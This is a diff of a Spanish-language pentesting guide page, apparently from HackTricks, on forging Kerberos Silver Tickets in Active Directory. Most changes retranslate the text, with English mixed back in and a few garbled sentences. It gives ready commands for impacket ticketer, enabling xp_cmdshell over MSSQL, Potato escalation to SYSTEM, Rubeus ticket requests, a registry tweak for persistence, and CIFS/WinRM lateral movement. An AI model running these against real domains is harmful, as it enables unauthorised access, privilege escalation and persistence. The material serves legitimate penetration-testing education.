@@ -6,15 +6,15 @@
 
 ## Silver ticket
 
-El ataque **Silver Ticket** implica la explotación de tickets de servicio en entornos de Active Directory (AD). Este método se basa en **adquirir el NTLM hash de una cuenta de servicio**, como una cuenta de equipo, para forjar un Ticket Granting Service (TGS) ticket. Con este ticket forjado, un atacante puede acceder a servicios específicos en la red, **hacerse pasar por cualquier usuario**, normalmente buscando privilegios administrativos. Se enfatiza que usar AES keys para forjar tickets es más seguro y menos detectable.
+El **Silver Ticket** attack implica la explotación de service tickets en entornos de Active Directory (AD). Este método se basa en **adquirir el NTLM hash de una cuenta de servicio**, como una cuenta de equipo, para forjar un Ticket Granting Service (TGS) ticket. Con este ticket forjado, un atacante puede acceder a servicios específicos en la red, **suplantando a cualquier usuario**, normalmente con el objetivo de obtener privilegios administrativos. Se enfatiza que usar AES keys para forjar tickets es más seguro y menos detectable.
 
 > [!WARNING]
-> Los Silver Tickets son menos detectables que los Golden Tickets porque solo requieren el **hash de la cuenta de servicio**, no la cuenta krbtgt. Sin embargo, están limitados al servicio específico al que apuntan. Además, basta con robar la contraseña de un usuario.
-> Además, si comprometes la **contraseña de una cuenta con un SPN** puedes usar esa contraseña para crear un Silver Ticket haciéndote pasar por cualquier usuario ante ese servicio.
+> Silver Tickets son menos detectables que Golden Tickets porque solo requieren el **hash de la cuenta de servicio**, no la cuenta krbtgt. Sin embargo, están limitados al servicio específico al que apuntan. Además, simplemente robar la contraseña de un usuario.
+> Además, si comprometes la **contraseña de una cuenta con un SPN** puedes usar esa contraseña para crear un Silver Ticket suplantando a cualquier usuario ante ese servicio.
 
 Para la creación de tickets, se emplean diferentes herramientas según el sistema operativo:
 
-### En Linux
+### On Linux
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
@@ -41,7 +41,7 @@ El servicio CIFS se destaca como un objetivo común para acceder al sistema de a
 
 ### Ejemplo: servicio MSSQL (MSSQLSvc) + Potato a SYSTEM
 
-Si tienes el hash NTLM (o la clave AES) de una cuenta de servicio SQL (p. ej., sqlsvc) puedes forjar un TGS para el SPN MSSQL y suplantar a cualquier usuario ante el servicio SQL. Desde ahí, habilita xp_cmdshell para ejecutar comandos como la cuenta del servicio SQL. Si ese token tiene SeImpersonatePrivilege, encadena un Potato para elevarte a SYSTEM.
+Si tienes el hash NTLM (o la clave AES) de una cuenta de servicio SQL (p. ej., sqlsvc) puedes forjar un TGS para el SPN MSSQL y suplantar a cualquier usuario ante el servicio SQL. Desde allí, habilita xp_cmdshell para ejecutar comandos como la cuenta de servicio SQL. Si ese token tiene SeImpersonatePrivilege, encadena un Potato para elevar a SYSTEM.
 ```bash
 # Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
 python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
@@ -52,20 +52,20 @@ export KRB5CCNAME=$PWD/administrator.ccache
 impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
 -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
 ```
-- Si el contexto resultante posee SeImpersonatePrivilege (a menudo cierto para cuentas de servicio), usa una variante de Potato para obtener SYSTEM:
+- Si el contexto resultante tiene SeImpersonatePrivilege (a menudo cierto para service accounts), usa una variante de Potato para obtener SYSTEM:
 ```bash
 # On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
 PrintSpoofer.exe -c "cmd /c whoami"
 # or
 GodPotato -cmd "cmd /c whoami"
 ```
-Más detalles sobre abusar de MSSQL y habilitar xp_cmdshell:
+Más detalles sobre el abuso de MSSQL y la habilitación de xp_cmdshell:
 
 {{#ref}}
 abusing-ad-mssql.md
 {{#endref}}
 
-Resumen de técnicas Potato:
+Resumen de Potato techniques:
 
 {{#ref}}
 ../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
@@ -73,22 +73,22 @@ Resumen de técnicas Potato:
 
 ## Servicios disponibles
 
-| Tipo de Servicio                           | Service Silver Tickets                                                     |
+| Service Type                               | Service Silver Tickets                                                     |
 | ------------------------------------------ | -------------------------------------------------------------------------- |
 | WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
+| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Dependiendo del sistema operativo también:</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                                      | <p>HOST</p><p>HTTP</p><p>En algunas ocasiones puedes simplemente solicitar: WINRM</p> |
 | Scheduled Tasks                            | HOST                                                                       |
 | Windows File Share, also psexec            | CIFS                                                                       |
 | LDAP operations, included DCSync           | LDAP                                                                       |
 | Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
 | Golden Tickets                             | krbtgt                                                                     |
 
-Usando **Rubeus** puedes **solicitar todos** estos tickets usando el parámetro:
+Usando **Rubeus** puedes **solicitar** todos estos tickets usando el parámetro:
 
 - `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### IDs de eventos de Silver tickets
+### Silver tickets Event IDs
 
 - 4624: Inicio de sesión de cuenta
 - 4634: Cierre de sesión de cuenta
@@ -96,11 +96,11 @@ Usando **Rubeus** puedes **solicitar todos** estos tickets usando el parámetro:
 
 ## Persistencia
 
-Para evitar que las máquinas roten su contraseña cada 30 días, establece `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` o puedes establecer `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` a un valor mayor que 30days para indicar el periodo de rotación cuando la contraseña de las máquinas debería ser rotada.
+Para evitar que las máquinas roten su contraseña cada 30 días establece `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` o puedes establecer `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` a un valor mayor que 30days para indicar el período de rotación cuando la contraseña de las máquinas debería rotarse.
 
-## Abusar de Service tickets
+## Abusing Service tickets
 
-En los siguientes ejemplos imaginemos que el ticket se obtuvo suplantando la cuenta del administrador.
+En los siguientes ejemplos imaginemos que el ticket se obtiene suplantando la cuenta de administrador.
 
 ### CIFS
 
@@ -110,7 +110,8 @@ dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-También podrás obtener un shell dentro del host o ejecutar comandos arbitrarios usando **psexec**:
+También podrás obtener una shell dentro del host o ejecutar comandos arbitrarios usando **psexec**:
+
 
 {{#ref}}
 ../lateral-movement/psexec-and-winexec.md
@@ -155,7 +156,7 @@ Con acceso winrm a un equipo puedes **acceder a él** e incluso obtener un Power
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-Consulta la siguiente página para aprender **más formas de conectarte a un host remoto usando winrm**:
+Check the following page to learn **more ways to connect with a remote host using winrm**:
 
 
 {{#ref}}
@@ -163,7 +164,7 @@ Consulta la siguiente página para aprender **más formas de conectarte a un hos
 {{#endref}}
 
 > [!WARNING]
-> Ten en cuenta que **winrm must be active and listening** en el equipo remoto para acceder a él.
+> Ten en cuenta que **winrm debe estar activo y escuchando** en el equipo remoto para poder acceder a él.
 
 ### LDAP
 
